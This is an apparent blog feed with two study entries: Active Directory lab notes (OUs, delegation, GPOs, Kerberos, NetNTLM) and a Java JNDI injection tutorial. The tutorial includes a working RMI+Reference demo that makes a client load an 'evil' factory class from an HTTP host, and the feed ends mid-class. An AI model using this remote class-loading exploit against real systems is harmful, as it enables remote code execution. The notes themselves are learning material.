        <content type="html"><![CDATA[<p>THM上的靶机，学习记录一下</p><h1 id="Windows-domain"><a href="#Windows-domain" class="headerlink" title="Windows domain"></a>Windows domain</h1><p>Windows域：微软中，企业管理用户和计算机的组织方式。</p><p>AD（Active Directory）：运行域的重要组件，AD中同时含有凭据</p><p>DC（Domain Controller）：运行AD服务的服务器</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/bebe5dfec0208bf563d01fa2dd1fb7a7.png" alt="Windows Domain Overview"></p><h1 id="Active-Directory"><a href="#Active-Directory" class="headerlink" title="Active Directory"></a>Active Directory</h1><p>保存网络上存在的所有“对象”信息，包括用户、组、机器、打印机、共享和许多其他对象</p><h2 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h2><ul><li>按使用者划分，例如按员工</li><li>按程序服务的划分，比如定义 IIS 或 MSSQL 等服务要使用的用户</li></ul><h2 id="机器"><a href="#机器" class="headerlink" title="机器"></a>机器</h2><ul><li>识别计算机帐户相对容易。它们遵循特定的命名方案。计算机帐户名称是计算机的名称，后跟一个美元符号。例如，名为 <code>DC01</code> 的计算机将具有名为 <code>DC01$</code> 的计算机帐户</li></ul><h2 id="安全组"><a href="#安全组" class="headerlink" title="安全组"></a>安全组</h2><ul><li>对用户或者机器进行划分，组可以嵌套组</li><li>一些典型的组</li></ul><table><thead><tr><th><strong>Security Group 安全组</strong></th><th><strong>Description 描述</strong></th></tr></thead><tbody><tr><td>Domain Admins 域管理员</td><td>Users of this group have administrative privileges over the entire domain. By default, they can administer any computer on the domain, including the DCs. 此组的用户对整个域具有管理权限。默认情况下，他们可以管理域上的任何计算机，包括 DC。</td></tr><tr><td>Server Operators 服务器操作员</td><td>Users in this group can administer Domain Controllers. They cannot change any administrative group memberships. 此组中的用户可以管理 Domain Controllers。他们无法更改任何管理组成员身份。</td></tr><tr><td>Backup Operators 备份操作员</td><td>Users in this group are allowed to access any file, ignoring their permissions. They are used to perform backups of data on computers. 允许此组中的用户访问任何文件，而忽略其权限。它们用于在计算机上执行数据备份。</td></tr><tr><td>Account Operators</td><td>Users in this group can create or modify other accounts in the domain. 此组中的用户可以创建或修改域中的其他帐户。</td></tr><tr><td>Domain Users 域用户</td><td>Includes all existing user accounts in the domain. 包括域中的所有现有用户帐户。</td></tr><tr><td>Domain Computers 域计算机</td><td>Includes all existing computers in the domain. 包括域中的所有现有计算机。</td></tr><tr><td>Domain Controllers 域控制器</td><td>Includes all existing DCs on the domain. 包括域上的所有现有 DC。</td></tr></tbody></table><p>查看user</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412131704390.png" alt="image-20241212145431584"></p><p>THM域下<strong>Organizational Units (OUs)</strong> </p><p>在THM OU下有4个部门</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412131704368.png" alt="image-20241212145537985"></p><p>默认的OU</p><ul><li><strong>Builtin:</strong> <strong>内置：</strong>包含可用于任何 Windows 主机的默认组。</li><li><strong>Computers:</strong> <strong>计算机：</strong>默认情况下，任何加入网络的计算机都将放在这里。如果需要，您可以移动它们。</li><li><strong>Domain Controllers:</strong> <strong>域控制器：</strong>包含网络中 DC 的默认 OU。</li><li><strong>Users:</strong> <strong>用户：</strong>适用于网域范围上下文的默认用户和用户组。</li><li><strong>Managed Service Accounts:</strong> <strong>托管服务帐户：</strong>保留 Windows 域中的服务使用的账户。</li></ul><blockquote><p>安全组和OU的区别</p></blockquote><ul><li><p><strong>OU</strong> 对于<strong>将策略应用于</strong>用户和计算机非常方便，其中包括与用户组相关的特定配置，具体取决于他们在企业中的特定角色。请记住，用户一次只能是单个 OU 的成员，因为尝试将两组不同的策略应用于单个用户是没有意义的。</p></li><li><p>另一方面，<strong>安全组</strong>用于<strong>授予对资源的权限</strong>。例如，如果要允许某些用户访问共享文件夹或网络打印机，则可以使用组。一个用户可以是多个组的一部分，这是授予对多个资源的访问权限所必需的。</p></li></ul><h2 id="删除OU"><a href="#删除OU" class="headerlink" title="删除OU"></a>删除OU</h2><p>启用view中的Advanced Features</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412131704480.png" alt="image-20241212151115766"></p><p>取消保护</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412131704989.png" alt="image-20241212151202245"></p><h2 id="委派"><a href="#委派" class="headerlink" title="委派"></a>委派</h2><blockquote><p>委派（delegation）是指让某些OU具有一定的控制权</p></blockquote><p>右键然后选择委派控制权</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412131704831.png" alt="image-20241212162231933"></p><p>然后选择成员，此处是Phillip，点击checkname自动补全</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2814715e1dbadaef334973028e02da69.png" alt="Delegating Sales OU to Phillip"></p><p>选择委派的权限</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/3f81df2b38e35ca5729aee7a76c6b220.png" alt="Delegating password resets"></p><p>一路next之后就委派成功</p><p>此时登录philillp账号来修改sophie用户的密码：Aa123456789</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\phillip&gt; <span class="built_in">Set-ADAccountPassword</span> sophie <span class="literal">-Reset</span> <span class="literal">-NewPassword</span> (<span class="built_in">Read-Host</span> <span class="literal">-AsSecureString</span> <span class="literal">-Prompt</span> <span class="string">&#x27;New Password&#x27;</span>) <span class="literal">-Verbose</span></span><br><span class="line"></span><br><span class="line">New Password: *********</span><br><span class="line"></span><br><span class="line">VERBOSE: Performing the operation <span class="string">&quot;Set-ADAccountPassword&quot;</span> on target <span class="string">&quot;CN=Sophie,OU=Sales,OU=THM,DC=thm,DC=local&quot;</span>.</span><br></pre></td></tr></table></figure><p>然后RDP连sophie</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412131705055.png" alt="image-20241212164525383"></p><h2 id="合理的OU配置"><a href="#合理的OU配置" class="headerlink" title="合理的OU配置"></a>合理的OU配置</h2><p>**1. Workstations **：存用户<br>工作站是 Active Directory 域中最常见的设备之一。域中的每个用户都可能登录到工作站。这是他们将用于完成工作或正常浏览活动的设备。这些设备绝不应有特权用户登录。</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412131724559.png" alt="image-20241212170041773"></p><p>**2. Servers **：存服务器<br>服务器是 Active Directory 域中第二常见的设备。服务器通常用于向用户或其他服务器提供服务。</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412131705969.png" alt="image-20241212170103100"></p><p>**3. Domain Controllers **：存域控<br>域控制器是 Active Directory 域中第三大最常见的设备。域控制器允许您管理 Active Directory 域。这些设备通常被视为网络中最敏感的设备，因为它们包含环境中所有用户帐户的哈希密码。</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412131724095.png" alt="image-20241212170123392"></p><h1 id="Group-Polices"><a href="#Group-Polices" class="headerlink" title="Group Polices"></a>Group Polices</h1><p>Windows 通过<strong>组策略对象 （GPO，Group Polices Object）</strong> 管理此OU的安全策略</p><p>打开Group Policy Management</p><p>GPO中分为指向OU的链接和GPO实体</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d82cb9440894c831f6f3d58a2b0538ed.png" alt="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d82cb9440894c831f6f3d58a2b0538ed.png"></p><p>默认域策略和 RDP 策略作为一个整体链接到 <code>thm.local</code> 域，并且 <code>Default Domain Controllers Policy</code> 仅链接到域控制器OU</p><p>任何 GPO 都将适用于链接的 OU 及其下的任何子 OU</p><p>Scope选项中如图所示：</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412131705430.png" alt="image-20241212170927506"></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412131705174.png" alt="image-20241212170941547"></p><h2 id="Edit"><a href="#Edit" class="headerlink" title="Edit"></a>Edit</h2><p>更改密码长度的策略的操作:</p><p>右键Edit Default Domain Policy</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412131705710.png" alt="image-20241212172936193"></p><h2 id="GPO-distribution"><a href="#GPO-distribution" class="headerlink" title="GPO distribution"></a>GPO distribution</h2><p>GPO 通过名为 <code>SYSVOL</code> 的网络共享分发到网络，该共享存储在 DC 中。域中的所有用户通常都应该能够通过网络访问此共享，以便定期同步其 GPO。默认情况下，SYSVOL 共享点指向我们网络中每个 DC 上的 <code>C：\Windows\SYSVOL\sysvol\</code> 目录</p><p>对任何 GPO 进行更改后，计算机可能需要长达 2 小时才能赶上进度。如果要强制任何特定计算机立即同步其 GPO，则始终可以在所需的计算机上运行以下命令：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpupdate /force</span><br></pre></td></tr></table></figure><h2 id="Create-for-THM-Inc"><a href="#Create-for-THM-Inc" class="headerlink" title="Create for THM Inc."></a>Create for THM Inc.</h2><ul><li>Restrict Access to Control Panel</li></ul><p>建立GPO</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412131705099.png" alt="image-20241212181030782"></p><p>直接将GPO拖拽到对应的OU即可建立链接</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412131705350.png" alt="image-20241212180932518"></p><ul><li>Auto Lock Screen GPO</li></ul><p>定义并修改时间</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412131705788.png" alt="image-20241212181322834"></p><p>总的来说就是建立GPO规则，然后进入edit修改规则，拉取链接即可</p><h1 id="Windows-Authentication"><a href="#Windows-Authentication" class="headerlink" title="Windows Authentication"></a>Windows Authentication</h1><p>在windows中使用如下协议完成认证</p><ul><li><strong>Kerberos:</strong> 由任何最新版本的 Windows 使用。这是任何最新域中的默认协议。</li><li><strong>NetNTLM:</strong> 保留旧式身份验证协议以实现兼容性。</li></ul><h2 id="kerberos"><a href="#kerberos" class="headerlink" title="kerberos"></a>kerberos</h2><p>认证过程：</p><ul><li>用户将用户名和密码时间戳（用户密码派生的密钥）发送到KDC（密钥分发中心，通常装在域控上），KDC将创建并发回TGT（Ticket Granting Ticket）和SessionKey，TGT是KDC上krbtgt账号的密钥进行加密的</li></ul><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d36f5a024c20fb480cdae8cd09ddc09f.png" alt="Kerberos step 1"></p><ul><li><p>当用户想要连接到网络上的服务（如共享、网站或数据库）时，他们将使用其 TGT 向 KDC 请求<strong>票证授予服务 （TGS）。</strong>TGS 是仅允许连接到为其创建的<strong>特定服务的票证</strong>。要请求 TGS，用户将发送其用户名和使用会话密钥加密的时间戳，以及 TGT 和服务<strong>主体名称 （SPN），该名称</strong>指示我们打算访问的服务和服务器名称。</p><p>因此，KDC 将向我们发送 TGS 和服务<strong>会话密钥</strong>，我们需要对其进行身份验证才能访问我们想要访问的服务。</p><p>TGS 使用从<strong>服务所有者哈希</strong>派生的密钥进行加密（服务所有者是运行服务的用户或计算机帐户）</p><p>TGS 的加密内容包含服务会话密钥的副本，以便服务所有者可以通过解密 TGS 来访问它。</p></li></ul><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/84504666e78373c613d3e05d176282dc.png" alt="Kerberos step 2"></p><ul><li>可以将 TGS 发送到所需的服务以进行身份验证并建立连接。该服务将使用其配置的账户的密码哈希来解密 TGS 并验证服务会话密钥。</li></ul><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/8fbf08d03459c1b792f3b6efa4d7f285.png" alt="Kerberos step 3"></p><h2 id="NetNTLM"><a href="#NetNTLM" class="headerlink" title="NetNTLM"></a>NetNTLM</h2><p>使用质询-响应机制：</p><ol><li>客户端向他们要访问的服务器发送身份验证请求。</li><li>服务器生成一个随机数并将其作为质询发送给客户端。</li><li>客户端将其 NTLM 密码哈希与质询 （和其他已知数据） 相结合，以生成对质询的响应，并将其发送回服务器进行验证。</li><li>服务器将质询和响应转发给域控制器进行验证。</li><li>域控制器使用质询重新计算响应，并将其与客户端发送的原始响应进行比较。如果它们都匹配，则对客户端进行身份验证;否则，将拒绝访问。身份验证结果将发送回服务器。</li><li>服务器将鉴权结果转发给客户端。</li></ol><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2eab5cacbd0d3e9dc9afb86169b711ec.png" alt="NetNTLM authentication"></p><h1 id="Windows-Tree-and-Forest"><a href="#Windows-Tree-and-Forest" class="headerlink" title="Windows Tree and Forest"></a>Windows Tree and Forest</h1><ul><li>Tree</li></ul><p>如图，<code>thm.local</code> 域被拆分为英国和美国分支的两个子域，您可以构建一个树，其中根域为 <code>thm.local</code>，两个子域分别名为 <code>uk.thm.local</code> 和 <code>us.thm.local</code>，每个子域都有其 AD、计算机和用户</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/abea24b7979676a1dcc0c568054544c8.png" alt="Tree"></p><blockquote><p>此时，需要引入一个新的安全组。<strong>Enterprise Admins</strong> 组将授予用户对企业所有域的管理权限。</p><p>每个域仍将拥有对其单个域具有管理员权限的域管理员，以及可以控制企业中所有内容的企业管理员</p></blockquote><ul><li>Forest</li></ul><p>将具有不同命名空间的多个域树合并到同一网络中称为<strong>域林</strong></p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/03448c2faf976db890118d835000bab7.png" alt="Forest"></p><ul><li>Trust Relationships</li></ul><p>域林之间的信任关系，分为单向信任关系和双向信任关系</p>]]></content>
      
      
      
        <tags>
            
            <tag> Domain Penetration </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JNDI注入学习</title>
      <link href="/2024/07/21/WebExploit/Java/JNDI-Injection/"/>
      <url>/2024/07/21/WebExploit/Java/JNDI-Injection/</url>
      
        <content type="html"><![CDATA[<h1 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h1><h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><p>JNDI(Java Naming and Directory Interface)是一个应用程序设计的API，</p><p>将键值对与对象进行绑定，通过名字检索指定的对象，对象可能存储在RMI、LDAP、CORBA等</p><p>说人话就是规定了一套接口来方便开发人员进行访问特定资源</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202411162111906.png" alt="Untitled"></p><p>JNDI的主要协议有：</p><table><thead><tr><th><strong>协议</strong></th><th><strong>作用</strong></th></tr></thead><tbody><tr><td>LDAP</td><td>轻量级目录访问协议，约定了 Client 与 Server 之间的信息交互格式、使用的端口号、认证方式等内容</td></tr><tr><td>RMI</td><td>JAVA 远程方法协议，该协议用于远程调用应用程序编程接口，使客户机上运行的程序可以调用远程服务器上的对象</td></tr><tr><td>DNS</td><td>域名服务</td></tr><tr><td>CORBA</td><td>公共对象请求代理体系结构</td></tr></tbody></table><h1 id="使用JNDI访问RMI对象"><a href="#使用JNDI访问RMI对象" class="headerlink" title="使用JNDI访问RMI对象"></a>使用JNDI访问RMI对象</h1><h2 id="InitialContext"><a href="#InitialContext" class="headerlink" title="InitialContext"></a>InitialContext</h2><p>在JNDI中定义了<code>InitialContext</code> 这种对象来管理</p><p>server.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// env写法</span></span><br><span class="line"><span class="comment">//        Properties env = new Properties();</span></span><br><span class="line"><span class="comment">//        env.put(Context.INITIAL_CONTEXT_FACTORY,&quot;com.sun.jndi.registry.RegistryContextFactory&quot;);</span></span><br><span class="line"><span class="comment">//        env.put(Context.PROVIDER_URL, &quot;rmi://127.0.0.1:1099&quot;);</span></span><br><span class="line"><span class="comment">//        InitialContext initialContext = new InitialContext();</span></span><br><span class="line"><span class="comment">//        LocateRegistry.createRegistry(1099);</span></span><br><span class="line"><span class="comment">//        RemoteObjImpl remoteObj = new RemoteObjImpl();  // RMI对象</span></span><br><span class="line"><span class="comment">//        initialContext.bind(&quot;remoteObj&quot;, remoteObj);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 非env写法</span></span><br><span class="line">         <span class="type">RemoteObjImpl</span> <span class="variable">remoteObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjImpl</span>();</span><br><span class="line">         <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">         <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">         initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>,remoteObj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>client.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">client</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">RemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (RemoteObj)initialContext.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/remoteObj&quot;</span>);</span><br><span class="line">        remoteObj.sayHello(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意需要实现相同的interface且在server和client上的路径需要一致，不然会报<code>no security manager: RMI class loader disabled</code>错误。</p><p>套了一层<code>InitialContext</code> ：</p><p>来看gpt怎么介绍这个<code>InitialContext</code>：</p><p><code>InitialContext</code> 是 Java EE (Enterprise Edition) 中的一个类，属于 <code>javax.naming</code> 包。它是 Java Naming and Directory Interface (JNDI) API 的一部分，主要用于在 Java 应用程序中查找和访问命名和目录服务。</p><p><code>InitialContext</code> 的功能和用法：</p><ol><li><strong>创建上下文</strong>：<code>InitialContext</code> 类用于创建一个初始的 JNDI 上下文，这个上下文可以用来查找其他上下文或资源。</li><li><strong>查找资源</strong>：通过 <code>InitialContext</code> 对象，你可以查找在命名和目录服务中注册的对象，如数据源、EJB (Enterprise Java Beans) 等。</li><li><strong>配置参数</strong>：在创建 <code>InitialContext</code> 实例时，可以传递一些环境属性（<code>Hashtable</code>），这些属性用于配置 JNDI 上下文的连接信息。</li></ol><p>可以查看到所有的RemoteObject的方法都被封装了</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202411162111057.png" alt="Untitled"></p><p>跟一下<code>getURLOrDefaultInitCtx(name).lookup(name);</code> ，首先解析协议名称</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202411162111935.png" alt="Untitled"></p><p>反正就是新建一个URLContext对象</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202411162111247.png" alt="Untitled"></p><p>继续跟进是一个getURLObject</p><p>![Untitled](C:\Users\14537\Desktop\be19137c-246f-4fa2-8390-0f64dae88819_Export-6ef4f9ac-96b1-47d5-82aa-201303514fca\Untitled 4.png)</p><p>传进入的是rmiURLContextFactory，所以直接新建了（顺道补一手Java工厂方法</p><p>也就是说，ResourceManager.getFactory()会通过context classloader加载对应的工厂类，然后调用工厂类的getObjectInstance方法来获取scheme对应协议的context</p><p>顺道补充下：当 uri 被省略的时候才会使用 env 中指定的 <code>INITIAL_CONTEXT_FACTORY</code> ，对应部分如下：</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202411162111226.png" alt="Untitled"></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202411162111500.png" alt="Untitled"></p><p>然后就是到封装后的lookup源码，可以发现这nm的封装了RegistryImpl_Stub的lookup函数</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202411162111805.png" alt="Untitled"></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>Reference类保存远程对象的引用，以封装的形式让程序通过引用来获取实际的远程对象</p><p>一般使用如下的Reference构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Reference(String className, String factory, String factoryLocation)</span><br></pre></td></tr></table></figure><ul><li>className：工厂类要去加载的类名</li><li>factory：远程加载的工厂类类名</li><li>factoryLocation：远程加载工厂类的地址（file http ftp等协议）</li></ul><p>客户端通过lookup得到Reference对象后，会继续访问factoryLocation，从而加载某个factory class，然后调用该factory实例的getObjectInstance方法，最终得到某个class（由className指定）</p><h1 id="JNDI注入-1"><a href="#JNDI注入-1" class="headerlink" title="JNDI注入"></a>JNDI注入</h1><h2 id="JNDI注入之RMI-Reference"><a href="#JNDI注入之RMI-Reference" class="headerlink" title="JNDI注入之RMI+Reference"></a>JNDI注入之RMI+Reference</h2><ul><li>demo：</li></ul><p>如果Reference的类地址可控，可以远程加载恶意对象</p><p>server.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 结尾的 / 不可省略</span></span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;evil&quot;</span>, <span class="string">&quot;evil&quot;</span>, <span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;RCE&quot;</span>,wrapper);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>client.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> <span class="string">&quot;rmi://127.0.0.1:1099/RCE&quot;</span>;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        initialContext.lookup(uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>踩坑：</li></ul><p>注意此处的evil class不能指定package</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">evil</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">evil</span><span class="params">()</span> 